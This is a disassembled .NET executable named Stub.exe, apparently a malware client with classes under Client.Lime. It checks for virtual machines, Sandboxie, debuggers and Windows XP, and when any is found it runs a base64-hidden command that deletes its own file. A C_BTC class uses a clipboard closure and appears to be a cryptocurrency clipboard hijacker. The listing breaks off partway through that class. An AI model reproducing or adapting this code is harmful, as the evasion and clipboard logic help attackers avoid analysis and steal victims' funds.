
//  Microsoft (R) .NET Framework IL Disassembler.  Version 4.6.1055.0
//  Copyright (c) Microsoft Corporation.  All rights reserved.



// Metadata version: v2.0.50727
.module extern kernel32.dll
.module extern NTdll.dll
.module extern coredll.dll
.module extern kernel32
.assembly extern mscorlib
{
  .publickeytoken = (B7 7A 5C 56 19 34 E0 89 )                         // .z\V.4..
  .ver 2:0:0:0
}
.assembly extern System
{
  .publickeytoken = (B7 7A 5C 56 19 34 E0 89 )                         // .z\V.4..
  .ver 2:0:0:0
}
.assembly extern Microsoft.VisualBasic
{
  .publickeytoken = (B0 3F 5F 7F 11 D5 0A 3A )                         // .?_....:
  .ver 8:0:0:0
}
.assembly extern System.Management
{
  .publickeytoken = (B0 3F 5F 7F 11 D5 0A 3A )                         // .?_....:
  .ver 2:0:0:0
}
.assembly extern System.Drawing
{
  .publickeytoken = (B0 3F 5F 7F 11 D5 0A 3A )                         // .?_....:
  .ver 2:0:0:0
}
.assembly extern System.Windows.Forms
{
  .publickeytoken = (B7 7A 5C 56 19 34 E0 89 )                         // .z\V.4..
  .ver 2:0:0:0
}
.assembly Stub
{
  .custom instance void [mscorlib]System.Runtime.CompilerServices.CompilationRelaxationsAttribute::.ctor(int32) = ( 01 00 08 00 00 00 00 00 ) 
  .custom instance void [mscorlib]System.Runtime.CompilerServices.RuntimeCompatibilityAttribute::.ctor() = ( 01 00 01 00 54 02 16 57 72 61 70 4E 6F 6E 45 78   // ....T..WrapNonEx
                                                                                                             63 65 70 74 69 6F 6E 54 68 72 6F 77 73 01 )       // ceptionThrows.

  // --- The following custom attribute is added automatically, do not uncomment -------
  //  .custom instance void [mscorlib]System.Diagnostics.DebuggableAttribute::.ctor(valuetype [mscorlib]System.Diagnostics.DebuggableAttribute/DebuggingModes) = ( 01 00 02 00 00 00 00 00 ) 

  .custom instance void [mscorlib]System.Reflection.AssemblyTitleAttribute::.ctor(string) = ( 01 00 00 00 00 ) 
  .custom instance void [mscorlib]System.Reflection.AssemblyDescriptionAttribute::.ctor(string) = ( 01 00 00 00 00 ) 
  .custom instance void [mscorlib]System.Reflection.AssemblyCompanyAttribute::.ctor(string) = ( 01 00 00 00 00 ) 
  .custom instance void [mscorlib]System.Reflection.AssemblyProductAttribute::.ctor(string) = ( 01 00 00 00 00 ) 
  .custom instance void [mscorlib]System.Reflection.AssemblyCopyrightAttribute::.ctor(string) = ( 01 00 00 00 00 ) 
  .custom instance void [mscorlib]System.Reflection.AssemblyTrademarkAttribute::.ctor(string) = ( 01 00 00 00 00 ) 
  .custom instance void [mscorlib]System.Runtime.InteropServices.ComVisibleAttribute::.ctor(bool) = ( 01 00 00 00 00 ) 
  .custom instance void [mscorlib]System.Runtime.InteropServices.GuidAttribute::.ctor(string) = ( 01 00 24 65 35 38 61 63 34 34 37 2D 61 62 30 37   // ..$e58ac447-ab07
                                                                                                  2D 34 30 32 61 2D 39 63 39 36 2D 39 35 65 32 38   // -402a-9c96-95e28
                                                                                                  34 61 37 36 61 38 64 00 00 )                      // 4a76a8d..
  .custom instance void [mscorlib]System.Reflection.AssemblyFileVersionAttribute::.ctor(string) = ( 01 00 07 31 2E 30 2E 30 2E 30 00 00 )             // ...1.0.0.0..
  .hash algorithm 0x00008004
  .ver 1:0:0:0
}
.module Stub.exe
// MVID: {1372C674-F057-416C-A878-F23A9D217CD9}
.imagebase 0x00400000
.file alignment 0x00000200
.stackreserve 0x00100000
.subsystem 0x0002       // WINDOWS_GUI
.corflags 0x00000003    //  ILONLY 32BITREQUIRED
// Image base: 0x00290000


// =============== CLASS MEMBERS DECLARATION ===================

.class private auto ansi Client.My.MyApplication
       extends [Microsoft.VisualBasic]Microsoft.VisualBasic.ApplicationServices.ConsoleApplicationBase
{
  .custom instance void [System]System.CodeDom.Compiler.GeneratedCodeAttribute::.ctor(string,
                                                                                      string) = ( 01 00 0A 4D 79 54 65 6D 70 6C 61 74 65 08 31 31   // ...MyTemplate.11
                                                                                                  2E 30 2E 30 2E 30 00 00 )                         // .0.0.0..
  .custom instance void [System]System.ComponentModel.EditorBrowsableAttribute::.ctor(valuetype [System]System.ComponentModel.EditorBrowsableState) = ( 01 00 01 00 00 00 00 00 ) 
  .method public specialname rtspecialname 
          instance void  .ctor() cil managed
  {
    // Code size       7 (0x7)
    .maxstack  8
    IL_0000:  ldarg.0
    IL_0001:  call       instance void [Microsoft.VisualBasic]Microsoft.VisualBasic.ApplicationServices.ConsoleApplicationBase::.ctor()
    IL_0006:  ret
  } // end of method MyApplication::.ctor

} // end of class Client.My.MyApplication

.class private auto ansi Client.My.MyComputer
       extends [Microsoft.VisualBasic]Microsoft.VisualBasic.Devices.Computer
{
  .custom instance void [System]System.CodeDom.Compiler.GeneratedCodeAttribute::.ctor(string,
                                                                                      string) = ( 01 00 0A 4D 79 54 65 6D 70 6C 61 74 65 08 31 31   // ...MyTemplate.11
                                                                                                  2E 30 2E 30 2E 30 00 00 )                         // .0.0.0..
  .custom instance void [System]System.ComponentModel.EditorBrowsableAttribute::.ctor(valuetype [System]System.ComponentModel.EditorBrowsableState) = ( 01 00 01 00 00 00 00 00 ) 
  .method public specialname rtspecialname 
          instance void  .ctor() cil managed
  {
    .custom instance void [mscorlib]System.Diagnostics.DebuggerHiddenAttribute::.ctor() = ( 01 00 00 00 ) 
    .custom instance void [System]System.ComponentModel.EditorBrowsableAttribute::.ctor(valuetype [System]System.ComponentModel.EditorBrowsableState) = ( 01 00 01 00 00 00 00 00 ) 
    // Code size       7 (0x7)
    .maxstack  8
    IL_0000:  ldarg.0
    IL_0001:  call       instance void [Microsoft.VisualBasic]Microsoft.VisualBasic.Devices.Computer::.ctor()
    IL_0006:  ret
  } // end of method MyComputer::.ctor

} // end of class Client.My.MyComputer

.class private auto ansi sealed beforefieldinit Client.My.MyProject
       extends [mscorlib]System.Object
{
  .custom instance void [Microsoft.VisualBasic]Microsoft.VisualBasic.CompilerServices.StandardModuleAttribute::.ctor() = ( 01 00 00 00 ) 
  .custom instance void [Microsoft.VisualBasic]Microsoft.VisualBasic.HideModuleNameAttribute::.ctor() = ( 01 00 00 00 ) 
  .custom instance void [System]System.CodeDom.Compiler.GeneratedCodeAttribute::.ctor(string,
                                                                                      string) = ( 01 00 0A 4D 79 54 65 6D 70 6C 61 74 65 08 31 31   // ...MyTemplate.11
                                                                                                  2E 30 2E 30 2E 30 00 00 )                         // .0.0.0..
  .class auto ansi sealed nested assembly MyWebServices
         extends [mscorlib]System.Object
  {
    .custom instance void [System]System.ComponentModel.EditorBrowsableAttribute::.ctor(valuetype [System]System.ComponentModel.EditorBrowsableState) = ( 01 00 01 00 00 00 00 00 ) 
    .custom instance void [Microsoft.VisualBasic]Microsoft.VisualBasic.MyGroupCollectionAttribute::.ctor(string,
                                                                                                         string,
                                                                                                         string,
                                                                                                         string) = ( 01 00 34 53 79 73 74 65 6D 2E 57 65 62 2E 53 65   // ..4System.Web.Se
                                                                                                                     72 76 69 63 65 73 2E 50 72 6F 74 6F 63 6F 6C 73   // rvices.Protocols
                                                                                                                     2E 53 6F 61 70 48 74 74 70 43 6C 69 65 6E 74 50   // .SoapHttpClientP
                                                                                                                     72 6F 74 6F 63 6F 6C 12 43 72 65 61 74 65 5F 5F   // rotocol.Create__
                                                                                                                     49 6E 73 74 61 6E 63 65 5F 5F 13 44 69 73 70 6F   // Instance__.Dispo
                                                                                                                     73 65 5F 5F 49 6E 73 74 61 6E 63 65 5F 5F 00 00   // se__Instance__..
                                                                                                                     00 ) 
    .method public hidebysig strict virtual 
            instance bool  Equals(object o) cil managed
    {
      .custom instance void [System]System.ComponentModel.EditorBrowsableAttribute::.ctor(valuetype [System]System.ComponentModel.EditorBrowsableState) = ( 01 00 01 00 00 00 00 00 ) 
      .custom instance void [mscorlib]System.Diagnostics.DebuggerHiddenAttribute::.ctor() = ( 01 00 00 00 ) 
      // Code size       13 (0xd)
      .maxstack  8
      IL_0000:  ldarg.0
      IL_0001:  ldarg.1
      IL_0002:  call       object [mscorlib]System.Runtime.CompilerServices.RuntimeHelpers::GetObjectValue(object)
      IL_0007:  call       instance bool [mscorlib]System.Object::Equals(object)
      IL_000c:  ret
    } // end of method MyWebServices::Equals

    .method public hidebysig strict virtual 
            instance int32  GetHashCode() cil managed
    {
      .custom instance void [System]System.ComponentModel.EditorBrowsableAttribute::.ctor(valuetype [System]System.ComponentModel.EditorBrowsableState) = ( 01 00 01 00 00 00 00 00 ) 
      .custom instance void [mscorlib]System.Diagnostics.DebuggerHiddenAttribute::.ctor() = ( 01 00 00 00 ) 
      // Code size       7 (0x7)
      .maxstack  8
      IL_0000:  ldarg.0
      IL_0001:  call       instance int32 [mscorlib]System.Object::GetHashCode()
      IL_0006:  ret
    } // end of method MyWebServices::GetHashCode

    .method assembly hidebysig instance class [mscorlib]System.Type 
            GetType() cil managed
    {
      .custom instance void [System]System.ComponentModel.EditorBrowsableAttribute::.ctor(valuetype [System]System.ComponentModel.EditorBrowsableState) = ( 01 00 01 00 00 00 00 00 ) 
      .custom instance void [mscorlib]System.Diagnostics.DebuggerHiddenAttribute::.ctor() = ( 01 00 00 00 ) 
      // Code size       11 (0xb)
      .maxstack  8
      IL_0000:  ldtoken    Client.My.MyProject/MyWebServices
      IL_0005:  call       class [mscorlib]System.Type [mscorlib]System.Type::GetTypeFromHandle(valuetype [mscorlib]System.RuntimeTypeHandle)
      IL_000a:  ret
    } // end of method MyWebServices::GetType

    .method public hidebysig strict virtual 
            instance string  ToString() cil managed
    {
      .custom instance void [System]System.ComponentModel.EditorBrowsableAttribute::.ctor(valuetype [System]System.ComponentModel.EditorBrowsableState) = ( 01 00 01 00 00 00 00 00 ) 
      .custom instance void [mscorlib]System.Diagnostics.DebuggerHiddenAttribute::.ctor() = ( 01 00 00 00 ) 
      // Code size       7 (0x7)
      .maxstack  8
      IL_0000:  ldarg.0
      IL_0001:  call       instance string [mscorlib]System.Object::ToString()
      IL_0006:  ret
    } // end of method MyWebServices::ToString

    .method private static !!T  Create__Instance__<.ctor T>(!!T 'instance') cil managed
    {
      .custom instance void [mscorlib]System.Diagnostics.DebuggerHiddenAttribute::.ctor() = ( 01 00 00 00 ) 
      // Code size       20 (0x14)
      .maxstack  1
      .locals init (!!T V_0)
      IL_0000:  ldarg.0
      IL_0001:  box        !!T
      IL_0006:  brtrue.s   IL_0010

      IL_0008:  call       !!0 [mscorlib]System.Activator::CreateInstance<!!0>()
      IL_000d:  stloc.0
      IL_000e:  br.s       IL_0012

      IL_0010:  ldarg.0
      IL_0011:  stloc.0
      IL_0012:  ldloc.0
      IL_0013:  ret
    } // end of method MyWebServices::Create__Instance__

    .method private instance void  Dispose__Instance__<T>(!!T& 'instance') cil managed
    {
      .custom instance void [mscorlib]System.Diagnostics.DebuggerHiddenAttribute::.ctor() = ( 01 00 00 00 ) 
      // Code size       8 (0x8)
      .maxstack  8
      IL_0000:  ldarg.1
      IL_0001:  initobj    !!T
      IL_0007:  ret
    } // end of method MyWebServices::Dispose__Instance__

    .method public specialname rtspecialname 
            instance void  .ctor() cil managed
    {
      .custom instance void [mscorlib]System.Diagnostics.DebuggerHiddenAttribute::.ctor() = ( 01 00 00 00 ) 
      .custom instance void [System]System.ComponentModel.EditorBrowsableAttribute::.ctor(valuetype [System]System.ComponentModel.EditorBrowsableState) = ( 01 00 01 00 00 00 00 00 ) 
      // Code size       7 (0x7)
      .maxstack  8
      IL_0000:  ldarg.0
      IL_0001:  call       instance void [mscorlib]System.Object::.ctor()
      IL_0006:  ret
    } // end of method MyWebServices::.ctor

  } // end of class MyWebServices

  .class auto ansi sealed nested assembly ThreadSafeObjectProvider`1<.ctor T>
         extends [mscorlib]System.Object
  {
    .custom instance void [System]System.ComponentModel.EditorBrowsableAttribute::.ctor(valuetype [System]System.ComponentModel.EditorBrowsableState) = ( 01 00 01 00 00 00 00 00 ) 
    .custom instance void [mscorlib]System.Runtime.InteropServices.ComVisibleAttribute::.ctor(bool) = ( 01 00 00 00 00 ) 
    .field private static !T m_ThreadStaticValue
    .custom instance void [mscorlib]System.Runtime.CompilerServices.CompilerGeneratedAttribute::.ctor() = ( 01 00 00 00 ) 
    .custom instance void [mscorlib]System.ThreadStaticAttribute::.ctor() = ( 01 00 00 00 ) 
    .method assembly specialname instance !T 
            get_GetInstance() cil managed
    {
      .custom instance void [mscorlib]System.Diagnostics.DebuggerHiddenAttribute::.ctor() = ( 01 00 00 00 ) 
      // Code size       28 (0x1c)
      .maxstack  8
      IL_0000:  ldsfld     !0 class Client.My.MyProject/ThreadSafeObjectProvider`1<!T>::m_ThreadStaticValue
      IL_0005:  box        !T
      IL_000a:  brtrue.s   IL_0016

      IL_000c:  call       !!0 [mscorlib]System.Activator::CreateInstance<!T>()
      IL_0011:  stsfld     !0 class Client.My.MyProject/ThreadSafeObjectProvider`1<!T>::m_ThreadStaticValue
      IL_0016:  ldsfld     !0 class Client.My.MyProject/ThreadSafeObjectProvider`1<!T>::m_ThreadStaticValue
      IL_001b:  ret
    } // end of method ThreadSafeObjectProvider`1::get_GetInstance

    .method public specialname rtspecialname 
            instance void  .ctor() cil managed
    {
      .custom instance void [mscorlib]System.Diagnostics.DebuggerHiddenAttribute::.ctor() = ( 01 00 00 00 ) 
      .custom instance void [System]System.ComponentModel.EditorBrowsableAttribute::.ctor(valuetype [System]System.ComponentModel.EditorBrowsableState) = ( 01 00 01 00 00 00 00 00 ) 
      // Code size       7 (0x7)
      .maxstack  8
      IL_0000:  ldarg.0
      IL_0001:  call       instance void [mscorlib]System.Object::.ctor()
      IL_0006:  ret
    } // end of method ThreadSafeObjectProvider`1::.ctor

    .property instance !T GetInstance()
    {
      .get instance !T Client.My.MyProject/ThreadSafeObjectProvider`1::get_GetInstance()
    } // end of property ThreadSafeObjectProvider`1::GetInstance
  } // end of class ThreadSafeObjectProvider`1

  .field private static initonly class Client.My.MyProject/ThreadSafeObjectProvider`1<class Client.My.MyComputer> m_ComputerObjectProvider
  .field private static initonly class Client.My.MyProject/ThreadSafeObjectProvider`1<class Client.My.MyApplication> m_AppObjectProvider
  .field private static initonly class Client.My.MyProject/ThreadSafeObjectProvider`1<class [Microsoft.VisualBasic]Microsoft.VisualBasic.ApplicationServices.User> m_UserObjectProvider
  .field private static initonly class Client.My.MyProject/ThreadSafeObjectProvider`1<class Client.My.MyProject/MyWebServices> m_MyWebServicesObjectProvider
  .method private specialname rtspecialname static 
          void  .cctor() cil managed
  {
    // Code size       41 (0x29)
    .maxstack  8
    IL_0000:  newobj     instance void class Client.My.MyProject/ThreadSafeObjectProvider`1<class Client.My.MyComputer>::.ctor()
    IL_0005:  stsfld     class Client.My.MyProject/ThreadSafeObjectProvider`1<class Client.My.MyComputer> Client.My.MyProject::m_ComputerObjectProvider
    IL_000a:  newobj     instance void class Client.My.MyProject/ThreadSafeObjectProvider`1<class Client.My.MyApplication>::.ctor()
    IL_000f:  stsfld     class Client.My.MyProject/ThreadSafeObjectProvider`1<class Client.My.MyApplication> Client.My.MyProject::m_AppObjectProvider
    IL_0014:  newobj     instance void class Client.My.MyProject/ThreadSafeObjectProvider`1<class [Microsoft.VisualBasic]Microsoft.VisualBasic.ApplicationServices.User>::.ctor()
    IL_0019:  stsfld     class Client.My.MyProject/ThreadSafeObjectProvider`1<class [Microsoft.VisualBasic]Microsoft.VisualBasic.ApplicationServices.User> Client.My.MyProject::m_UserObjectProvider
    IL_001e:  newobj     instance void class Client.My.MyProject/ThreadSafeObjectProvider`1<class Client.My.MyProject/MyWebServices>::.ctor()
    IL_0023:  stsfld     class Client.My.MyProject/ThreadSafeObjectProvider`1<class Client.My.MyProject/MyWebServices> Client.My.MyProject::m_MyWebServicesObjectProvider
    IL_0028:  ret
  } // end of method MyProject::.cctor

  .method assembly specialname static class Client.My.MyComputer 
          get_Computer() cil managed
  {
    .custom instance void [mscorlib]System.Diagnostics.DebuggerHiddenAttribute::.ctor() = ( 01 00 00 00 ) 
    // Code size       11 (0xb)
    .maxstack  8
    IL_0000:  ldsfld     class Client.My.MyProject/ThreadSafeObjectProvider`1<class Client.My.MyComputer> Client.My.MyProject::m_ComputerObjectProvider
    IL_0005:  callvirt   instance !0 class Client.My.MyProject/ThreadSafeObjectProvider`1<class Client.My.MyComputer>::get_GetInstance()
    IL_000a:  ret
  } // end of method MyProject::get_Computer

  .method assembly specialname static class Client.My.MyApplication 
          get_Application() cil managed
  {
    .custom instance void [mscorlib]System.Diagnostics.DebuggerHiddenAttribute::.ctor() = ( 01 00 00 00 ) 
    // Code size       11 (0xb)
    .maxstack  8
    IL_0000:  ldsfld     class Client.My.MyProject/ThreadSafeObjectProvider`1<class Client.My.MyApplication> Client.My.MyProject::m_AppObjectProvider
    IL_0005:  callvirt   instance !0 class Client.My.MyProject/ThreadSafeObjectProvider`1<class Client.My.MyApplication>::get_GetInstance()
    IL_000a:  ret
  } // end of method MyProject::get_Application

  .method assembly specialname static class [Microsoft.VisualBasic]Microsoft.VisualBasic.ApplicationServices.User 
          get_User() cil managed
  {
    .custom instance void [mscorlib]System.Diagnostics.DebuggerHiddenAttribute::.ctor() = ( 01 00 00 00 ) 
    // Code size       11 (0xb)
    .maxstack  8
    IL_0000:  ldsfld     class Client.My.MyProject/ThreadSafeObjectProvider`1<class [Microsoft.VisualBasic]Microsoft.VisualBasic.ApplicationServices.User> Client.My.MyProject::m_UserObjectProvider
    IL_0005:  callvirt   instance !0 class Client.My.MyProject/ThreadSafeObjectProvider`1<class [Microsoft.VisualBasic]Microsoft.VisualBasic.ApplicationServices.User>::get_GetInstance()
    IL_000a:  ret
  } // end of method MyProject::get_User

  .method assembly specialname static class Client.My.MyProject/MyWebServices 
          get_WebServices() cil managed
  {
    .custom instance void [mscorlib]System.Diagnostics.DebuggerHiddenAttribute::.ctor() = ( 01 00 00 00 ) 
    // Code size       11 (0xb)
    .maxstack  8
    IL_0000:  ldsfld     class Client.My.MyProject/ThreadSafeObjectProvider`1<class Client.My.MyProject/MyWebServices> Client.My.MyProject::m_MyWebServicesObjectProvider
    IL_0005:  callvirt   instance !0 class Client.My.MyProject/ThreadSafeObjectProvider`1<class Client.My.MyProject/MyWebServices>::get_GetInstance()
    IL_000a:  ret
  } // end of method MyProject::get_WebServices

  .property class Client.My.MyComputer Computer()
  {
    .custom instance void [System]System.ComponentModel.Design.HelpKeywordAttribute::.ctor(string) = ( 01 00 0B 4D 79 2E 43 6F 6D 70 75 74 65 72 00 00 ) // ...My.Computer..
    .get class Client.My.MyComputer Client.My.MyProject::get_Computer()
  } // end of property MyProject::Computer
  .property class Client.My.MyApplication
          Application()
  {
    .custom instance void [System]System.ComponentModel.Design.HelpKeywordAttribute::.ctor(string) = ( 01 00 0E 4D 79 2E 41 70 70 6C 69 63 61 74 69 6F   // ...My.Applicatio
                                                                                                       6E 00 00 )                                        // n..
    .get class Client.My.MyApplication Client.My.MyProject::get_Application()
  } // end of property MyProject::Application
  .property class [Microsoft.VisualBasic]Microsoft.VisualBasic.ApplicationServices.User
          User()
  {
    .custom instance void [System]System.ComponentModel.Design.HelpKeywordAttribute::.ctor(string) = ( 01 00 07 4D 79 2E 55 73 65 72 00 00 )             // ...My.User..
    .get class [Microsoft.VisualBasic]Microsoft.VisualBasic.ApplicationServices.User Client.My.MyProject::get_User()
  } // end of property MyProject::User
  .property class Client.My.MyProject/MyWebServices
          WebServices()
  {
    .custom instance void [System]System.ComponentModel.Design.HelpKeywordAttribute::.ctor(string) = ( 01 00 0E 4D 79 2E 57 65 62 53 65 72 76 69 63 65   // ...My.WebService
                                                                                                       73 00 00 )                                        // s..
    .get class Client.My.MyProject/MyWebServices Client.My.MyProject::get_WebServices()
  } // end of property MyProject::WebServices
} // end of class Client.My.MyProject

.class public auto ansi Client.Lime.C_AntiVM
       extends [mscorlib]System.Object
{
  .method public specialname rtspecialname 
          instance void  .ctor() cil managed
  {
    // Code size       7 (0x7)
    .maxstack  8
    IL_0000:  ldarg.0
    IL_0001:  call       instance void [mscorlib]System.Object::.ctor()
    IL_0006:  ret
  } // end of method C_AntiVM::.ctor

  .method public static pinvokeimpl("kernel32.dll" winapi) 
          bool  LoadLibrary(string dllToLoad) cil managed preservesig
  {
  }
  .method public static void  Check() cil managed noinlining nooptimization
  {
    // Code size       160 (0xa0)
    .maxstack  4
    .locals init (class [mscorlib]System.Exception V_0)
    .try
    {
      IL_0000:  call       bool Client.Lime.C_AntiVM::DetectVirtualMachine()
      IL_0005:  brtrue.s   IL_005e

      IL_0007:  call       object Client.Lime.C_ID::MyOS()
      IL_000c:  callvirt   instance string [mscorlib]System.Object::ToString()
      IL_0011:  callvirt   instance string [mscorlib]System.String::ToLower()
      IL_0016:  ldstr      "XP"
      IL_001b:  call       instance string [mscorlib]System.String::ToLower()
      IL_0020:  callvirt   instance bool [mscorlib]System.String::Contains(string)
      IL_0025:  brtrue.s   IL_005e

      IL_0027:  ldstr      "SbieDll.dll"
      IL_002c:  call       bool Client.Lime.C_AntiVM::LoadLibrary(string)
      IL_0031:  brtrue.s   IL_005e

      IL_0033:  call       bool [mscorlib]System.Diagnostics.Debugger::IsLogging()
      IL_0038:  brtrue.s   IL_005e

      IL_003a:  call       bool [mscorlib]System.Diagnostics.Debugger::get_IsAttached()
      IL_003f:  brtrue.s   IL_005e

      IL_0041:  ldstr      "windir"
      IL_0046:  call       string [mscorlib]System.Environment::GetEnvironmentVariable(string)
      IL_004b:  ldstr      "\\vboxhook.dll"
      IL_0050:  call       string [mscorlib]System.String::Concat(string,
                                                                  string)
      IL_0055:  call       bool [mscorlib]System.IO.File::Exists(string)
      IL_005a:  brtrue.s   IL_005e

      IL_005c:  leave.s    IL_009f

      IL_005e:  ldstr      "Y21kLmV4ZSAvYyBwaW5nIDAgLW4gMiAmIGRlbCA="
      IL_0063:  call       uint8[] [mscorlib]System.Convert::FromBase64String(string)
      IL_0068:  call       string Client.Lime.C_Fuctions::BS(uint8[])
      IL_006d:  ldstr      "\""
      IL_0072:  call       string [System.Windows.Forms]System.Windows.Forms.Application::get_ExecutablePath()
      IL_0077:  ldstr      "\""
      IL_007c:  call       string [mscorlib]System.String::Concat(string,
                                                                  string,
                                                                  string,
                                                                  string)
      IL_0081:  ldc.i4.0
      IL_0082:  ldc.i4.0
      IL_0083:  ldc.i4.m1
      IL_0084:  call       int32 [Microsoft.VisualBasic]Microsoft.VisualBasic.Interaction::Shell(string,
                                                                                                 valuetype [Microsoft.VisualBasic]Microsoft.VisualBasic.AppWinStyle,
                                                                                                 bool,
                                                                                                 int32)
      IL_0089:  pop
      IL_008a:  call       void [Microsoft.VisualBasic]Microsoft.VisualBasic.CompilerServices.ProjectData::EndApp()
      IL_008f:  leave.s    IL_009f

    }  // end .try
    catch [mscorlib]System.Exception 
    {
      IL_0091:  dup
      IL_0092:  call       void [Microsoft.VisualBasic]Microsoft.VisualBasic.CompilerServices.ProjectData::SetProjectError(class [mscorlib]System.Exception)
      IL_0097:  stloc.0
      IL_0098:  call       void [Microsoft.VisualBasic]Microsoft.VisualBasic.CompilerServices.ProjectData::ClearProjectError()
      IL_009d:  leave.s    IL_009f

    }  // end handler
    IL_009f:  ret
  } // end of method C_AntiVM::Check

  .method private static bool  DetectVirtualMachine() cil managed
  {
    // Code size       227 (0xe3)
    .maxstack  3
    .locals init (bool V_0,
             class [System.Management]System.Management.ManagementObjectSearcher V_1,
             class [System.Management]System.Management.ManagementObjectCollection V_2,
             class [System.Management]System.Management.ManagementObjectCollection/ManagementObjectEnumerator V_3,
             class [System.Management]System.Management.ManagementBaseObject V_4,
             string V_5,
             class [mscorlib]System.Exception V_6)
    .try
    {
      IL_0000:  ldstr      "Select * from Win32_ComputerSystem"
      IL_0005:  newobj     instance void [System.Management]System.Management.ManagementObjectSearcher::.ctor(string)
      IL_000a:  stloc.1
      .try
      {
        IL_000b:  ldloc.1
        IL_000c:  callvirt   instance class [System.Management]System.Management.ManagementObjectCollection [System.Management]System.Management.ManagementObjectSearcher::Get()
        IL_0011:  stloc.2
        .try
        {
          .try
          {
            IL_0012:  ldloc.2
            IL_0013:  callvirt   instance class [System.Management]System.Management.ManagementObjectCollection/ManagementObjectEnumerator [System.Management]System.Management.ManagementObjectCollection::GetEnumerator()
            IL_0018:  stloc.3
            IL_0019:  br         IL_009f

            IL_001e:  ldloc.3
            IL_001f:  callvirt   instance class [System.Management]System.Management.ManagementBaseObject [System.Management]System.Management.ManagementObjectCollection/ManagementObjectEnumerator::get_Current()
            IL_0024:  stloc.s    V_4
            IL_0026:  ldloc.s    V_4
            IL_0028:  ldstr      "Manufacturer"
            IL_002d:  callvirt   instance object [System.Management]System.Management.ManagementBaseObject::get_Item(string)
            IL_0032:  callvirt   instance string [mscorlib]System.Object::ToString()
            IL_0037:  callvirt   instance string [mscorlib]System.String::ToLower()
            IL_003c:  stloc.s    V_5
            IL_003e:  ldloc.s    V_5
            IL_0040:  ldstr      "microsoft corporation"
            IL_0045:  ldc.i4.0
            IL_0046:  call       int32 [Microsoft.VisualBasic]Microsoft.VisualBasic.CompilerServices.Operators::CompareString(string,
                                                                                                                              string,
                                                                                                                              bool)
            IL_004b:  brtrue.s   IL_006f

            IL_004d:  ldloc.s    V_4
            IL_004f:  ldstr      "Model"
            IL_0054:  callvirt   instance object [System.Management]System.Management.ManagementBaseObject::get_Item(string)
            IL_0059:  callvirt   instance string [mscorlib]System.Object::ToString()
            IL_005e:  callvirt   instance string [mscorlib]System.String::ToUpperInvariant()
            IL_0063:  ldstr      "VIRTUAL"
            IL_0068:  callvirt   instance bool [mscorlib]System.String::Contains(string)
            IL_006d:  brtrue.s   IL_009b

            IL_006f:  ldloc.s    V_5
            IL_0071:  ldstr      "vmware"
            IL_0076:  callvirt   instance bool [mscorlib]System.String::Contains(string)
            IL_007b:  brtrue.s   IL_009b

            IL_007d:  ldloc.s    V_4
            IL_007f:  ldstr      "Model"
            IL_0084:  callvirt   instance object [System.Management]System.Management.ManagementBaseObject::get_Item(string)
            IL_0089:  callvirt   instance string [mscorlib]System.Object::ToString()
            IL_008e:  ldstr      "VirtualBox"
            IL_0093:  ldc.i4.0
            IL_0094:  call       int32 [Microsoft.VisualBasic]Microsoft.VisualBasic.CompilerServices.Operators::CompareString(string,
                                                                                                                              string,
                                                                                                                              bool)
            IL_0099:  brtrue.s   IL_009f

            IL_009b:  ldc.i4.1
            IL_009c:  stloc.0
            IL_009d:  leave.s    IL_00e1

            IL_009f:  ldloc.3
            IL_00a0:  callvirt   instance bool [System.Management]System.Management.ManagementObjectCollection/ManagementObjectEnumerator::MoveNext()
            IL_00a5:  brtrue     IL_001e

            IL_00aa:  leave.s    IL_00b6

          }  // end .try
          finally
          {
            IL_00ac:  ldloc.3
            IL_00ad:  brfalse.s  IL_00b5

            IL_00af:  ldloc.3
            IL_00b0:  callvirt   instance void [mscorlib]System.IDisposable::Dispose()
            IL_00b5:  endfinally
          }  // end handler
          IL_00b6:  leave.s    IL_00c2

        }  // end .try
        finally
        {
          IL_00b8:  ldloc.2
          IL_00b9:  brfalse.s  IL_00c1

          IL_00bb:  ldloc.2
          IL_00bc:  callvirt   instance void [mscorlib]System.IDisposable::Dispose()
          IL_00c1:  endfinally
        }  // end handler
        IL_00c2:  leave.s    IL_00ce

      }  // end .try
      finally
      {
        IL_00c4:  ldloc.1
        IL_00c5:  brfalse.s  IL_00cd

        IL_00c7:  ldloc.1
        IL_00c8:  callvirt   instance void [mscorlib]System.IDisposable::Dispose()
        IL_00cd:  endfinally
      }  // end handler
      IL_00ce:  leave.s    IL_00df

    }  // end .try
    catch [mscorlib]System.Exception 
    {
      IL_00d0:  dup
      IL_00d1:  call       void [Microsoft.VisualBasic]Microsoft.VisualBasic.CompilerServices.ProjectData::SetProjectError(class [mscorlib]System.Exception)
      IL_00d6:  stloc.s    V_6
      IL_00d8:  call       void [Microsoft.VisualBasic]Microsoft.VisualBasic.CompilerServices.ProjectData::ClearProjectError()
      IL_00dd:  leave.s    IL_00df

    }  // end handler
    IL_00df:  ldc.i4.0
    IL_00e0:  stloc.0
    IL_00e1:  ldloc.0
    IL_00e2:  ret
  } // end of method C_AntiVM::DetectVirtualMachine

} // end of class Client.Lime.C_AntiVM

.class public auto ansi Client.Lime.C_BTC
       extends [mscorlib]System.Object
{
  .class auto ansi sealed nested assembly '_Closure$__R1-0'
         extends [mscorlib]System.Object
  {
    .custom instance void [mscorlib]System.Runtime.CompilerServices.CompilerGeneratedAttribute::.ctor() = ( 01 00 00 00 ) 
    .field public class [Microsoft.VisualBasic]Microsoft.VisualBasic.MyServices.ClipboardProxy $VB$NonLocal_2
    .method public specialname rtspecialname 
            instance void  .ctor(class Client.Lime.C_BTC/'_Closure$__R1-0' arg0) cil managed
    {
      // Code size       22 (0x16)
      .maxstack  8
      IL_0000:  ldarg.0
      IL_0001:  call       instance void [mscorlib]System.Object::.ctor()
      IL_0006:  ldarg.1
      IL_0007:  brfalse.s  IL_0015

      IL_0009:  ldarg.0
      IL_000a:  ldarg.1
      IL_000b:  ldfld      class [Microsoft.VisualBasic]Microsoft.VisualBasic.MyServices.ClipboardProxy Client.Lime.C_BTC/'_Closure$__R1-0'::$VB$NonLocal_2
      IL_0010:  stfld      class [Microsoft.VisualBasic]Microsoft.VisualBasic.MyServices.ClipboardProxy Client.Lime.C_BTC/'_Closure$__R1-0'::$VB$NonLocal_2
      IL_0015:  ret
    } // end of method '_Closure$__R1-0'::.ctor

    .method assembly specialname instance void 
            _Lambda$__R2(object a0) cil managed
    {
      // Code size       18 (0x12)
      .maxstack  8
      IL_0000:  ldarg.0
      IL_0001:  ldfld      class [Microsoft.VisualBasic]Microsoft.VisualBasic.MyServices.ClipboardProxy Client.Lime.C_BTC/'_Closure$__R1-0'::$VB$NonLocal_2
